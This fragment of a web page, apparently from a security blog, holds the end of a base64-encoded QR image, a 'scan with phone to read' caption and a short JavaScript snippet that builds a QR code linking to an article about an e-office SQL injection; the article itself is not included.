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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/eoffice-webservice-json-email-wsdl-sqli.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 